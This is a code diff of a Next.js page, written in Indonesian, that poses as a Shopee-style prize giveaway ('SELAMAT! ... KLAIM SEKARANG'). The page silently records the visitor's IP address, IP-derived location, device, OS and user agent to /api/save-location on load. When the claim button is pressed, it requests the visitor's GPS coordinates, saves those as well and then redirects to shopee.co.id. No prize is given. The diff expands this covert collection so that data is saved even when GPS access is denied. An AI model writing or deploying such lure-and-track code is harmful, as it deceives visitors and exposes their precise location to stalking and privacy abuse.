@@ -1,121 +1,167 @@
+/* eslint-disable @typescript-eslint/no-explicit-any */
 "use client";
 
-import { useEffect } from "react";
+import { useEffect, useState } from "react";
 import confetti from "canvas-confetti";
 
 export default function TrackPage() {
+  const [ipData, setIpData] = useState<any>(null);
+  const [deviceInfo, setDeviceInfo] = useState<any>(null);
+  const [loading, setLoading] = useState(false);
+
   useEffect(() => {
     async function run() {
-      try {
-        const ipRes = await fetch("/api/get-ip");
-        const ipData = await ipRes.json();
+      const ipRes = await fetch("/api/get-ip");
+      const ipJson = await ipRes.json();
+      setIpData(ipJson);
 
-        const deviceInfo = getDeviceInfo();
+      const d = getDeviceInfo();
+      setDeviceInfo(d);
 
-        await fetch("/api/save-location", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            device: deviceInfo.device,
-            userAgent: deviceInfo.ua,
-            ip: ipData.ip,
-            ipCity: ipData.ipCity,
-            ipCountry: ipData.ipCountry,
-            ipLat: ipData.ipLat,
-            ipLon: ipData.ipLon,
-            gpsLat: null,
-            gpsLon: null,
-          }),
-        });
-      // eslint-disable-next-line @typescript-eslint/no-unused-vars
-      } catch (e) {}
+      await fetch("/api/save-location", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          ...ipJson,
+          ...d,
+          gpsLat: null,
+          gpsLon: null,
+        }),
+      });
+
+      setTimeout(() => {
+        confetti({ particleCount: 150, spread: 80 });
+      }, 300);
     }
 
     run();
-
-    setTimeout(() => {
-      confetti({ particleCount: 150, spread: 80, origin: { y: 0.6 } });
-    }, 400);
   }, []);
 
   async function handleClaim() {
+    setLoading(true);
+
+    if (!ipData || !deviceInfo) {
+      setTimeout(() => {
+        window.location.href = "https://shopee.co.id";
+      }, 1200);
+      return;
+    }
+
     if ("geolocation" in navigator) {
       navigator.geolocation.getCurrentPosition(
         async (pos) => {
-          await fetch("/api/save-location", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              gpsLat: pos.coords.latitude,
-              gpsLon: pos.coords.longitude,
-            }),
-          });
+          try {
+            await fetch("/api/save-location", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                ...ipData,
+                ...deviceInfo,
+                gpsLat: pos.coords.latitude,
+                gpsLon: pos.coords.longitude,
+              }),
+            });
 
-          confetti({ particleCount: 300, spread: 100 });
-          window.location.href = "https://shopee.co.id";
+            confetti({ particleCount: 300, spread: 100 });
+          } finally {
+            setTimeout(() => {
+              window.location.href = "https://shopee.co.id";
+            }, 1200);
+          }
         },
-        () => {
-          window.location.href = "https://shopee.co.id";
-        }
+
+        async () => {
+          try {
+            await fetch("/api/save-location", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                ...ipData,
+                ...deviceInfo,
+                gpsLat: null,
+                gpsLon: null,
+              }),
+            });
+          } finally {
+            setTimeout(() => {
+              window.location.href = "https://shopee.co.id";
+            }, 1200);
+          }
+        },
+
+        { timeout: 8000 }
       );
     } else {
-      window.location.href = "https://shopee.co.id";
+      setTimeout(() => {
+        window.location.href = "https://shopee.co.id";
+      }, 1200);
     }
   }
 
   return (
     <div style={styles.container}>
       <div style={styles.card}>
-        <h2 style={styles.title}>🎉 SELAMAT!</h2>
-        <p style={styles.text}>Anda mendapatkan kesempatan hadiah menarik!</p>
-        <p style={styles.text}>Klik tombol di bawah untuk klaim hadiah Anda.</p>
+        {loading ? (
+          <>
+            <h2 style={styles.title}>⏳ Tunggu Sebentar...</h2>
+            <p style={styles.text}>Sedang memverifikasi hadiah Anda…</p>
+          </>
+        ) : (
+          <>
+            <h2 style={styles.title}>🎉 SELAMAT!</h2>
+            <p style={styles.text}>Anda mendapatkan kesempatan hadiah menarik!</p>
 
-        <button style={styles.button} onClick={handleClaim}>
-          🎁 KLAIM SEKARANG
-        </button>
+            <button style={styles.button} onClick={handleClaim}>
+              🎁 KLAIM SEKARANG
+            </button>
+          </>
+        )}
       </div>
     </div>
   );
 }
 
 function getDeviceInfo() {
-  const ua =
-    typeof navigator !== "undefined" ? navigator.userAgent : "unknown";
+  const ua = navigator.userAgent.toLowerCase();
 
-  const devices = [
-    "iPhone",
-    "iPad",
-    "Samsung",
-    "Xiaomi",
-    "OPPO",
-    "Vivo",
-    "Realme",
-    "Huawei",
-    "Infinix",
-    "Poco",
-    "Sony",
-    "Nokia",
-    "Asus",
-    "Lenovo",
-    "Motorola",
-    "Google Pixel",
-    "TECNO",
+  let os = "Unknown OS";
+  if (ua.includes("windows nt")) os = "Windows";
+  else if (ua.includes("mac os x")) os = "MacOS";
+  else if (ua.includes("android")) os = "Android";
+  else if (ua.includes("iphone")) os = "iPhone iOS";
+  else if (ua.includes("ipad")) os = "iPad iOS";
+  else if (ua.includes("linux")) os = "Linux";
+  else if (ua.includes("cros")) os = "ChromeOS";
+
+  let deviceType = "Desktop";
+  if (/mobile/i.test(ua)) deviceType = "Mobile";
+  if (/tablet/i.test(ua) || ua.includes("ipad")) deviceType = "Tablet";
+
+  const brands = [
+    "Samsung", "Xiaomi", "OPPO", "Vivo", "Realme",
+    "Huawei", "Infinix", "Poco", "Sony", "Nokia",
+    "Asus", "Lenovo", "Tecno", "Google Pixel",
+    "iPhone", "iPad"
   ];
 
-  let detected = "Unknown Device";
-  for (const d of devices) {
-    if (ua.toLowerCase().includes(d.toLowerCase())) {
-      detected = d;
-    }
+  let brand = "Unknown";
+  for (const b of brands) {
+    if (ua.includes(b.toLowerCase())) brand = b;
   }
 
-  if (detected === "Unknown Device" && /Android/i.test(ua))
-    detected = "Android Phone";
+  if (deviceType === "Desktop") brand = os;
 
-  return { device: detected, ua };
+  return {
+    device: brand,
+    deviceType,
+    os,
+    userAgent: navigator.userAgent,
+  };
 }
 
-const styles = {
+
+// eslint-disable-next-line @typescript-eslint/no-explicit-any
+const styles: any = {
   container: {
     minHeight: "100vh",
     background: "#ffefe0",
@@ -125,23 +171,16 @@ const styles = {
     padding: 20,
   },
   card: {
-    background: "white",
-    padding: "30px 25px",
-    borderRadius: 15,
-    boxShadow: "0 6px 18px rgba(0,0,0,0.15)",
-    textAlign: "center",
+    background: "#fff",
+    padding: 30,
     maxWidth: 360,
     width: "100%",
+    borderRadius: 18,
+    textAlign: "center",
+    boxShadow: "0 6px 20px rgba(0,0,0,0.2)",
   },
-  title: {
-    fontSize: 28,
-    fontWeight: "bold",
-    marginBottom: 10,
-  },
-  text: {
-    fontSize: 16,
-    marginBottom: 12,
-  },
+  title: { fontSize: 28, fontWeight: "bold", marginBottom: 10 },
+  text: { fontSize: 16, marginBottom: 15 },
   button: {
     background: "#ff5722",
     padding: "14px 20px",
@@ -153,4 +192,4 @@ const styles = {
     fontSize: 18,
     fontWeight: "bold",
   },
-} as const;
+};
